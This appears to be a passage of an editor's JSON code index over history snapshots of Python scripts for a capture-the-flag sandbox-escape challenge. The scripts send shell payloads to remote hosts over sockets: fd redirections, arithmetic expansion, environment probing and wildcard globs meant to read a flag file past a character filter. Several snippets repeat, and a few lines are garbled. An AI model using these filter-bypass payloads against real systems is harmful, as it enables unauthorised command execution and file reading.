        "peekOfCode": "test_payloads = [\n    \"6>&1\", \"7>&1\", \"8>&1\", \"9>&1\", \"10>&1\",\n    \"$((6>&1))\", \"$((7>&1))\", \"$((8>&1))\", \"$((9>&1))\", \"$((10>&1))\"\n]\ndef send_payload(payload):\n    with socket.create_connection((HOST, PORT)) as s:\n        try:\n            # Ensure the payload is sent with a newline to simulate Enter key\n            s.sendall(payload.encode() + b'\\n')\n            time.sleep(0.5)  # Allow time for the response",
        "detail": ".history.gpt_20250515213904",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.gpt_20250515214028",
        "description": ".history.gpt_20250515214028",
        "peekOfCode": "def send_payload(payload):\n    with socket.create_connection((HOST, PORT)) as s:\n        try:\n            # Ensure the payload is sent with a newline to simulate Enter key\n            s.sendall(payload.encode() + b'\\n')\n            time.sleep(0.5)  # Allow time for the response\n            response = s.recv(4096).decode(errors='ignore')\n            return response\n        except Exception as e:\n            return f\"[ERROR] {e}\"",
        "detail": ".history.gpt_20250515214028",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.gpt_20250515214028",
        "description": ".history.gpt_20250515214028",
        "peekOfCode": "def main():\n    for payload in test_payloads:\n        print(f\"[*] Testing payload: {payload}\")\n        output = send_payload(payload)\n        print(f\"[+] Response:\\n{output}\\n{'-' * 60}\")\nif __name__ == \"__main__\":\n    main()",
        "detail": ".history.gpt_20250515214028",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.gpt_20250515214028",
        "description": ".history.gpt_20250515214028",
        "peekOfCode": "HOST = '94.237.123.126'\nPORT = 34445eplace with the actual port number\n# List of test payloads including redirections for file descriptors 6–10\ntest_payloads = [\n    \"6>&1\", \"7>&1\", \"8>&1\", \"9>&1\", \"10>&1\",\n    \"$((6>&1))\", \"$((7>&1))\", \"$((8>&1))\", \"$((9>&1))\", \"$((10>&1))\"\n]\ndef send_payload(payload):\n    with socket.create_connection((HOST, PORT)) as s:\n        try:",
        "detail": ".history.gpt_20250515214028",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.gpt_20250515214028",
        "description": ".history.gpt_20250515214028",
        "peekOfCode": "PORT = 34445eplace with the actual port number\n# List of test payloads including redirections for file descriptors 6–10\ntest_payloads = [\n    \"6>&1\", \"7>&1\", \"8>&1\", \"9>&1\", \"10>&1\",\n    \"$((6>&1))\", \"$((7>&1))\", \"$((8>&1))\", \"$((9>&1))\", \"$((10>&1))\"\n]\ndef send_payload(payload):\n    with socket.create_connection((HOST, PORT)) as s:\n        try:\n            # Ensure the payload is sent with a newline to simulate Enter key",
        "detail": ".history.gpt_20250515214028",
        "documentation": {}
    },
    {
        "label": "test_payloads",
        "kind": 5,
        "importPath": ".history.gpt_20250515214028",
        "description": ".history.gpt_20250515214028",
        "peekOfCode": "test_payloads = [\n    \"6>&1\", \"7>&1\", \"8>&1\", \"9>&1\", \"10>&1\",\n    \"$((6>&1))\", \"$((7>&1))\", \"$((8>&1))\", \"$((9>&1))\", \"$((10>&1))\"\n]\ndef send_payload(payload):\n    with socket.create_connection((HOST, PORT)) as s:\n        try:\n            # Ensure the payload is sent with a newline to simulate Enter key\n            s.sendall(payload.encode() + b'\\n')\n            time.sleep(0.5)  # Allow time for the response",
        "detail": ".history.gpt_20250515214028",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.gpt_20250515214043",
        "description": ".history.gpt_20250515214043",
        "peekOfCode": "def send_payload(payload):\n    with socket.create_connection((HOST, PORT)) as s:\n        try:\n            # Ensure the payload is sent with a newline to simulate Enter key\n            s.sendall(payload.encode() + b'\\n')\n            time.sleep(0.5)  # Allow time for the response\n            response = s.recv(4096).decode(errors='ignore')\n            return response\n        except Exception as e:\n            return f\"[ERROR] {e}\"",
        "detail": ".history.gpt_20250515214043",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.gpt_20250515214043",
        "description": ".history.gpt_20250515214043",
        "peekOfCode": "def main():\n    for payload in test_payloads:\n        print(f\"[*] Testing payload: {payload}\")\n        output = send_payload(payload)\n        print(f\"[+] Response:\\n{output}\\n{'-' * 60}\")\nif __name__ == \"__main__\":\n    main()",
        "detail": ".history.gpt_20250515214043",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.gpt_20250515214043",
        "description": ".history.gpt_20250515214043",
        "peekOfCode": "HOST = '94.237.123.126'\nPORT = 34445 # replace with the actual port number\n# List of test payloads including redirections for file descriptors 6–10\ntest_payloads = [\n    \"6>&1\", \"7>&1\", \"8>&1\", \"9>&1\", \"10>&1\",\n    \"$((6>&1))\", \"$((7>&1))\", \"$((8>&1))\", \"$((9>&1))\", \"$((10>&1))\"\n]\ndef send_payload(payload):\n    with socket.create_connection((HOST, PORT)) as s:\n        try:",
        "detail": ".history.gpt_20250515214043",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.gpt_20250515214043",
        "description": ".history.gpt_20250515214043",
        "peekOfCode": "PORT = 34445 # replace with the actual port number\n# List of test payloads including redirections for file descriptors 6–10\ntest_payloads = [\n    \"6>&1\", \"7>&1\", \"8>&1\", \"9>&1\", \"10>&1\",\n    \"$((6>&1))\", \"$((7>&1))\", \"$((8>&1))\", \"$((9>&1))\", \"$((10>&1))\"\n]\ndef send_payload(payload):\n    with socket.create_connection((HOST, PORT)) as s:\n        try:\n            # Ensure the payload is sent with a newline to simulate Enter key",
        "detail": ".history.gpt_20250515214043",
        "documentation": {}
    },
    {
        "label": "test_payloads",
        "kind": 5,
        "importPath": ".history.gpt_20250515214043",
        "description": ".history.gpt_20250515214043",
        "peekOfCode": "test_payloads = [\n    \"6>&1\", \"7>&1\", \"8>&1\", \"9>&1\", \"10>&1\",\n    \"$((6>&1))\", \"$((7>&1))\", \"$((8>&1))\", \"$((9>&1))\", \"$((10>&1))\"\n]\ndef send_payload(payload):\n    with socket.create_connection((HOST, PORT)) as s:\n        try:\n            # Ensure the payload is sent with a newline to simulate Enter key\n            s.sendall(payload.encode() + b'\\n')\n            time.sleep(0.5)  # Allow time for the response",
        "detail": ".history.gpt_20250515214043",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.gpt_20250515215936",
        "description": ".history.gpt_20250515215936",
        "peekOfCode": "def send_payload(payload):\n    try:\n        with socket.create_connection((HOST, PORT), timeout=3) as s:\n            s.sendall(payload.encode() + b'\\n')\n            time.sleep(0.5)  # wait for response\n            response = s.recv(4096)\n            return response.decode(errors='ignore')\n    except Exception as e:\n        return f\"[ERROR] {e}\"\ndef main():",
        "detail": ".history.gpt_20250515215936",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.gpt_20250515215936",
        "description": ".history.gpt_20250515215936",
        "peekOfCode": "def main():\n    for payload in test_payloads:\n        print(f\"\\n[>>] Payload: {repr(payload)}\")\n        output = send_payload(payload)\n        print(f\"[<<] Response:\\n{output}\\n{'=' * 50}\")\nif __name__ == \"__main__\":\n    main()",
        "detail": ".history.gpt_20250515215936",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.gpt_20250515215936",
        "description": ".history.gpt_20250515215936",
        "peekOfCode": "HOST = '94.237.123.126'\nPORT = 34445\n# Payloads based on:\n# - Arithmetic expansion (to try implicit command execution)\n# - Wildcard probing (for guessing commands/paths)\n# - Leading space bypass (to bypass character filter)\n# - File descriptor redirection (to test output on higher FDs)\ntest_payloads = [\n    # Arithmetic expansions that yield numeric results (could trigger commands like `4`, `5`, `6`, etc.)\n    \" $((2+2))\", ",
        "detail": ".history.gpt_20250515215936",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.gpt_20250515215936",
        "description": ".history.gpt_20250515215936",
        "peekOfCode": "PORT = 34445\n# Payloads based on:\n# - Arithmetic expansion (to try implicit command execution)\n# - Wildcard probing (for guessing commands/paths)\n# - Leading space bypass (to bypass character filter)\n# - File descriptor redirection (to test output on higher FDs)\ntest_payloads = [\n    # Arithmetic expansions that yield numeric results (could trigger commands like `4`, `5`, `6`, etc.)\n    \" $((2+2))\", \n    \" $((3+2))\", ",
        "detail": ".history.gpt_20250515215936",
        "documentation": {}
    },
    {
        "label": "test_payloads",
        "kind": 5,
        "importPath": ".history.gpt_20250515215936",
        "description": ".history.gpt_20250515215936",
        "peekOfCode": "test_payloads = [\n    # Arithmetic expansions that yield numeric results (could trigger commands like `4`, `5`, `6`, etc.)\n    \" $((2+2))\", \n    \" $((3+2))\", \n    \" $((10-5))\", \n    \" $((6))\", \n    \" $((7))\", \n    \" $((8))\", \n    \" $((9))\", \n    \" $((10))\",",
        "detail": ".history.gpt_20250515215936",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.gpt_20250517151725",
        "description": ".history.gpt_20250517151725",
        "peekOfCode": "def send_payload(payload):\n    try:\n        with socket.create_connection((HOST, PORT), timeout=3) as s:\n            s.sendall(payload.encode() + b'\\n')\n            time.sleep(0.5)  # wait for response\n            response = s.recv(4096)\n            return response.decode(errors='ignore')\n    except Exception as e:\n        return f\"[ERROR] {e}\"\ndef main():",
        "detail": ".history.gpt_20250517151725",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.gpt_20250517151725",
        "description": ".history.gpt_20250517151725",
        "peekOfCode": "def main():\n    for payload in test_payloads:\n        print(f\"\\n[>>] Payload: {repr(payload)}\")\n        output = send_payload(payload)\n        print(f\"[<<] Response:\\n{output}\\n{'=' * 50}\")\nif __name__ == \"__main__\":\n    main()",
        "detail": ".history.gpt_20250517151725",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.gpt_20250517151725",
        "description": ".history.gpt_20250517151725",
        "peekOfCode": "HOST = '94.237.123.87\nPORT = 44123\n# Payloads based on:\n# - Arithmetic expansion (to try implicit command execution)\n# - Wildcard probing (for guessing commands/paths)\n# - Leading space bypass (to bypass character filter)\n# - File descriptor redirection (to test output on higher FDs)\ntest_payloads = [\n    # Arithmetic expansions that yield numeric results (could trigger commands like `4`, `5`, `6`, etc.)\n    \" $((2+2))\", ",
        "detail": ".history.gpt_20250517151725",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.gpt_20250517151725",
        "description": ".history.gpt_20250517151725",
        "peekOfCode": "PORT = 44123\n# Payloads based on:\n# - Arithmetic expansion (to try implicit command execution)\n# - Wildcard probing (for guessing commands/paths)\n# - Leading space bypass (to bypass character filter)\n# - File descriptor redirection (to test output on higher FDs)\ntest_payloads = [\n    # Arithmetic expansions that yield numeric results (could trigger commands like `4`, `5`, `6`, etc.)\n    \" $((2+2))\", \n    \" $((3+2))\", ",
        "detail": ".history.gpt_20250517151725",
        "documentation": {}
    },
    {
        "label": "test_payloads",
        "kind": 5,
        "importPath": ".history.gpt_20250517151725",
        "description": ".history.gpt_20250517151725",
        "peekOfCode": "test_payloads = [\n    # Arithmetic expansions that yield numeric results (could trigger commands like `4`, `5`, `6`, etc.)\n    \" $((2+2))\", \n    \" $((3+2))\", \n    \" $((10-5))\", \n    \" $((6))\", \n    \" $((7))\", \n    \" $((8))\", \n    \" $((9))\", \n    \" $((10))\",",
        "detail": ".history.gpt_20250517151725",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.gpt_20250517151739",
        "description": ".history.gpt_20250517151739",
        "peekOfCode": "def send_payload(payload):\n    try:\n        with socket.create_connection((HOST, PORT), timeout=3) as s:\n            s.sendall(payload.encode() + b'\\n')\n            time.sleep(0.5)  # wait for response\n            response = s.recv(4096)\n            return response.decode(errors='ignore')\n    except Exception as e:\n        return f\"[ERROR] {e}\"\ndef main():",
        "detail": ".history.gpt_20250517151739",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.gpt_20250517151739",
        "description": ".history.gpt_20250517151739",
        "peekOfCode": "def main():\n    for payload in test_payloads:\n        print(f\"\\n[>>] Payload: {repr(payload)}\")\n        output = send_payload(payload)\n        print(f\"[<<] Response:\\n{output}\\n{'=' * 50}\")\nif __name__ == \"__main__\":\n    main()",
        "detail": ".history.gpt_20250517151739",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.gpt_20250517151739",
        "description": ".history.gpt_20250517151739",
        "peekOfCode": "HOST = '94.237.123.87'\nPORT = 44123\n# Payloads based on:\n# - Arithmetic expansion (to try implicit command execution)\n# - Wildcard probing (for guessing commands/paths)\n# - Leading space bypass (to bypass character filter)\n# - File descriptor redirection (to test output on higher FDs)\ntest_payloads = [\n    # Arithmetic expansions that yield numeric results (could trigger commands like `4`, `5`, `6`, etc.)\n    \" $((2+2))\", ",
        "detail": ".history.gpt_20250517151739",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.gpt_20250517151739",
        "description": ".history.gpt_20250517151739",
        "peekOfCode": "PORT = 44123\n# Payloads based on:\n# - Arithmetic expansion (to try implicit command execution)\n# - Wildcard probing (for guessing commands/paths)\n# - Leading space bypass (to bypass character filter)\n# - File descriptor redirection (to test output on higher FDs)\ntest_payloads = [\n    # Arithmetic expansions that yield numeric results (could trigger commands like `4`, `5`, `6`, etc.)\n    \" $((2+2))\", \n    \" $((3+2))\", ",
        "detail": ".history.gpt_20250517151739",
        "documentation": {}
    },
    {
        "label": "test_payloads",
        "kind": 5,
        "importPath": ".history.gpt_20250517151739",
        "description": ".history.gpt_20250517151739",
        "peekOfCode": "test_payloads = [\n    # Arithmetic expansions that yield numeric results (could trigger commands like `4`, `5`, `6`, etc.)\n    \" $((2+2))\", \n    \" $((3+2))\", \n    \" $((10-5))\", \n    \" $((6))\", \n    \" $((7))\", \n    \" $((8))\", \n    \" $((9))\", \n    \" $((10))\",",
        "detail": ".history.gpt_20250517151739",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.qwen_20250515221205",
        "description": ".history.qwen_20250515221205",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\n# Payload to read flag.txt using wildcard expansion\npayload = b\"/???/??? ?????????\\n\"\ntry:\n    # Create a socket object\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        # Connect to the target\n        s.connect((HOST, PORT))\n        print(\"[+] Connected to target\")",
        "detail": ".history.qwen_20250515221205",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.qwen_20250515221205",
        "description": ".history.qwen_20250515221205",
        "peekOfCode": "PORT = 34445\n# Payload to read flag.txt using wildcard expansion\npayload = b\"/???/??? ?????????\\n\"\ntry:\n    # Create a socket object\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        # Connect to the target\n        s.connect((HOST, PORT))\n        print(\"[+] Connected to target\")\n        # Send the payload",
        "detail": ".history.qwen_20250515221205",
        "documentation": {}
    },
    {
        "label": "payload",
        "kind": 5,
        "importPath": ".history.qwen_20250515221205",
        "description": ".history.qwen_20250515221205",
        "peekOfCode": "payload = b\"/???/??? ?????????\\n\"\ntry:\n    # Create a socket object\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        # Connect to the target\n        s.connect((HOST, PORT))\n        print(\"[+] Connected to target\")\n        # Send the payload\n        s.sendall(payload)\n        print(\"[+] Payload sent\")",
        "detail": ".history.qwen_20250515221205",
        "documentation": {}
    },
    {
        "label": "recv_until_prompt",
        "kind": 2,
        "importPath": ".history.qwen_20250515221659",
        "description": ".history.qwen_20250515221659",
        "peekOfCode": "def recv_until_prompt(s, prompt):\n    buffer = b\"\"\n    while prompt not in buffer:\n        data = s.recv(4096)\n        if not data:\n            break\n        buffer += data\n        # Print progress\n        print(data.decode('utf-8', errors='replace'), end='')\n    return buffer",
        "detail": ".history.qwen_20250515221659",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.qwen_20250515221659",
        "description": ".history.qwen_20250515221659",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\n# Payload to read flag.txt using wildcard expansion\npayload = b\"/???/??? ?????????\\n\"\n# Prompt to wait for before sending the payload\nPROMPT = b\"Broken@Shell$ \"\ndef recv_until_prompt(s, prompt):\n    buffer = b\"\"\n    while prompt not in buffer:\n        data = s.recv(4096)",
        "detail": ".history.qwen_20250515221659",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.qwen_20250515221659",
        "description": ".history.qwen_20250515221659",
        "peekOfCode": "PORT = 34445\n# Payload to read flag.txt using wildcard expansion\npayload = b\"/???/??? ?????????\\n\"\n# Prompt to wait for before sending the payload\nPROMPT = b\"Broken@Shell$ \"\ndef recv_until_prompt(s, prompt):\n    buffer = b\"\"\n    while prompt not in buffer:\n        data = s.recv(4096)\n        if not data:",
        "detail": ".history.qwen_20250515221659",
        "documentation": {}
    },
    {
        "label": "payload",
        "kind": 5,
        "importPath": ".history.qwen_20250515221659",
        "description": ".history.qwen_20250515221659",
        "peekOfCode": "payload = b\"/???/??? ?????????\\n\"\n# Prompt to wait for before sending the payload\nPROMPT = b\"Broken@Shell$ \"\ndef recv_until_prompt(s, prompt):\n    buffer = b\"\"\n    while prompt not in buffer:\n        data = s.recv(4096)\n        if not data:\n            break\n        buffer += data",
        "detail": ".history.qwen_20250515221659",
        "documentation": {}
    },
    {
        "label": "PROMPT",
        "kind": 5,
        "importPath": ".history.qwen_20250515221659",
        "description": ".history.qwen_20250515221659",
        "peekOfCode": "PROMPT = b\"Broken@Shell$ \"\ndef recv_until_prompt(s, prompt):\n    buffer = b\"\"\n    while prompt not in buffer:\n        data = s.recv(4096)\n        if not data:\n            break\n        buffer += data\n        # Print progress\n        print(data.decode('utf-8', errors='replace'), end='')",
        "detail": ".history.qwen_20250515221659",
        "documentation": {}
    },
    {
        "label": "recv_until_prompt",
        "kind": 2,
        "importPath": ".history.qwen_20250515223643",
        "description": ".history.qwen_20250515223643",
        "peekOfCode": "def recv_until_prompt(s, prompt):\n    buffer = b\"\"\n    while prompt not in buffer:\n        data = s.recv(4096)\n        if not data:\n            break\n        buffer += data\n    return buffer\ntry:\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:",
        "detail": ".history.qwen_20250515223643",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.qwen_20250515223643",
        "description": ".history.qwen_20250515223643",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\n# Payload to read flag.txt using wildcard expansion\npayload = b\"/???/???/??? ?????????\\n\"\n# Prompt to wait for before sending the payload\nPROMPT = b\"Broken@Shell$ \"\ndef recv_until_prompt(s, prompt):\n    buffer = b\"\"\n    while prompt not in buffer:\n        data = s.recv(4096)",
        "detail": ".history.qwen_20250515223643",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.qwen_20250515223643",
        "description": ".history.qwen_20250515223643",
        "peekOfCode": "PORT = 34445\n# Payload to read flag.txt using wildcard expansion\npayload = b\"/???/???/??? ?????????\\n\"\n# Prompt to wait for before sending the payload\nPROMPT = b\"Broken@Shell$ \"\ndef recv_until_prompt(s, prompt):\n    buffer = b\"\"\n    while prompt not in buffer:\n        data = s.recv(4096)\n        if not data:",
        "detail": ".history.qwen_20250515223643",
        "documentation": {}
    },
    {
        "label": "payload",
        "kind": 5,
        "importPath": ".history.qwen_20250515223643",
        "description": ".history.qwen_20250515223643",
        "peekOfCode": "payload = b\"/???/???/??? ?????????\\n\"\n# Prompt to wait for before sending the payload\nPROMPT = b\"Broken@Shell$ \"\ndef recv_until_prompt(s, prompt):\n    buffer = b\"\"\n    while prompt not in buffer:\n        data = s.recv(4096)\n        if not data:\n            break\n        buffer += data",
        "detail": ".history.qwen_20250515223643",
        "documentation": {}
    },
    {
        "label": "PROMPT",
        "kind": 5,
        "importPath": ".history.qwen_20250515223643",
        "description": ".history.qwen_20250515223643",
        "peekOfCode": "PROMPT = b\"Broken@Shell$ \"\ndef recv_until_prompt(s, prompt):\n    buffer = b\"\"\n    while prompt not in buffer:\n        data = s.recv(4096)\n        if not data:\n            break\n        buffer += data\n    return buffer\ntry:",
        "detail": ".history.qwen_20250515223643",
        "documentation": {}
    },
    {
        "label": "recv_until_prompt",
        "kind": 2,
        "importPath": ".history.qwen_20250515223752",
        "description": ".history.qwen_20250515223752",
        "peekOfCode": "def recv_until_prompt(s, prompt):\n    buffer = b\"\"\n    while prompt not in buffer:\n        data = s.recv(4096)\n        if not data:\n            break\n        buffer += data\n    return buffer\ntry:\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:",
        "detail": ".history.qwen_20250515223752",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.qwen_20250515223752",
        "description": ".history.qwen_20250515223752",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\n# Payload to read flag.txt using wildcard expansion\npayload = \"/???/?????????????????/????????? >&1\"\n# Prompt to wait for before sending the payload\nPROMPT = b\"Broken@Shell$ \"\ndef recv_until_prompt(s, prompt):\n    buffer = b\"\"\n    while prompt not in buffer:\n        data = s.recv(4096)",
        "detail": ".history.qwen_20250515223752",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.qwen_20250515223752",
        "description": ".history.qwen_20250515223752",
        "peekOfCode": "PORT = 34445\n# Payload to read flag.txt using wildcard expansion\npayload = \"/???/?????????????????/????????? >&1\"\n# Prompt to wait for before sending the payload\nPROMPT = b\"Broken@Shell$ \"\ndef recv_until_prompt(s, prompt):\n    buffer = b\"\"\n    while prompt not in buffer:\n        data = s.recv(4096)\n        if not data:",
        "detail": ".history.qwen_20250515223752",
        "documentation": {}
    },
    {
        "label": "payload",
        "kind": 5,
        "importPath": ".history.qwen_20250515223752",
        "description": ".history.qwen_20250515223752",
        "peekOfCode": "payload = \"/???/?????????????????/????????? >&1\"\n# Prompt to wait for before sending the payload\nPROMPT = b\"Broken@Shell$ \"\ndef recv_until_prompt(s, prompt):\n    buffer = b\"\"\n    while prompt not in buffer:\n        data = s.recv(4096)\n        if not data:\n            break\n        buffer += data",
        "detail": ".history.qwen_20250515223752",
        "documentation": {}
    },
    {
        "label": "PROMPT",
        "kind": 5,
        "importPath": ".history.qwen_20250515223752",
        "description": ".history.qwen_20250515223752",
        "peekOfCode": "PROMPT = b\"Broken@Shell$ \"\ndef recv_until_prompt(s, prompt):\n    buffer = b\"\"\n    while prompt not in buffer:\n        data = s.recv(4096)\n        if not data:\n            break\n        buffer += data\n    return buffer\ntry:",
        "detail": ".history.qwen_20250515223752",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515014506",
        "description": ".history.SandBox-Escape_20250515014506",
        "peekOfCode": "def main():\n    # Connect to the service\n    conn = remote(HOST, PORT)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv(timeout=2).decode()\n        print(initial_response)\n        # Send payloads one by one\n        for i, payload in enumerate(payloads):",
        "detail": ".history.SandBox-Escape_20250515014506",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515014506",
        "description": ".history.SandBox-Escape_20250515014506",
        "peekOfCode": "HOST = \"83.136.249.246\" # <--- Change this\nPORT = 52341 # <--- Change this\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\n# More targeted payloads using only allowed characters\npayloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable",
        "detail": ".history.SandBox-Escape_20250515014506",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515014506",
        "description": ".history.SandBox-Escape_20250515014506",
        "peekOfCode": "PORT = 52341 # <--- Change this\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\n# More targeted payloads using only allowed characters\npayloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory",
        "detail": ".history.SandBox-Escape_20250515014506",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515014506",
        "description": ".history.SandBox-Escape_20250515014506",
        "peekOfCode": "payloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory\n    \"$HOME\",                   # Home directory\n    \"$SHELL\",                  # Shell type\n    \"$USER\",                   # Current user",
        "detail": ".history.SandBox-Escape_20250515014506",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515195956",
        "description": ".history.SandBox-Escape_20250515195956",
        "peekOfCode": "def main():\n    # Connect to the service\n    conn = remote(HOST, PORT)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv(timeout=2).decode()\n        print(initial_response)\n        # Send payloads one by one\n        for i, payload in enumerate(payloads):",
        "detail": ".history.SandBox-Escape_20250515195956",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515195956",
        "description": ".history.SandBox-Escape_20250515195956",
        "peekOfCode": "HOST = \"111.111.111.111\" # <--- Change this\nPORT = 1337 # <--- Change this\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\n# More targeted payloads using only allowed characters\npayloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable",
        "detail": ".history.SandBox-Escape_20250515195956",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515195956",
        "description": ".history.SandBox-Escape_20250515195956",
        "peekOfCode": "PORT = 1337 # <--- Change this\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\n# More targeted payloads using only allowed characters\npayloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory",
        "detail": ".history.SandBox-Escape_20250515195956",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515195956",
        "description": ".history.SandBox-Escape_20250515195956",
        "peekOfCode": "payloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory\n    \"$HOME\",                   # Home directory\n    \"$SHELL\",                  # Shell type\n    \"$USER\",                   # Current user",
        "detail": ".history.SandBox-Escape_20250515195956",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515200001",
        "description": ".history.SandBox-Escape_20250515200001",
        "peekOfCode": "def main():\n    # Connect to the service\n    conn = remote(HOST, PORT)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv(timeout=2).decode()\n        print(initial_response)\n        # Send payloads one by one\n        for i, payload in enumerate(payloads):",
        "detail": ".history.SandBox-Escape_20250515200001",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515200001",
        "description": ".history.SandBox-Escape_20250515200001",
        "peekOfCode": "HOST = \"111.111.111.111\" # <--- Change this\nPORT = 1337 # <--- Change this\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\n# More targeted payloads using only allowed characters\npayloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable",
        "detail": ".history.SandBox-Escape_20250515200001",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515200001",
        "description": ".history.SandBox-Escape_20250515200001",
        "peekOfCode": "PORT = 1337 # <--- Change this\n# Allowed characters based on regex provided: ^[0-9${}/?\"[:space:]:&>_=()]+\n# More targeted payloads using only allowed characters\npayloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory",
        "detail": ".history.SandBox-Escape_20250515200001",
        "documentation": {}
    },
    {
        "label": "payloads",
        "kind": 5,
        "importPath": ".history.SandBox-Escape_20250515200001",
        "description": ".history.SandBox-Escape_20250515200001",
        "peekOfCode": "payloads = [\n    # Basic information gathering\n    \"$?\",                      # Last exit code\n    \"$$\",                      # Current PID\n    \"$0\",                      # Current shell\n    \"$PATH\",                   # PATH environment variable\n    \"$PWD\",                    # Current directory\n    \"$HOME\",                   # Home directory\n    \"$SHELL\",                  # Shell type\n    \"$USER\",                   # Current user",
        "detail": ".history.SandBox-Escape_20250515200001",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.SandBox-Escape_20250515200002",
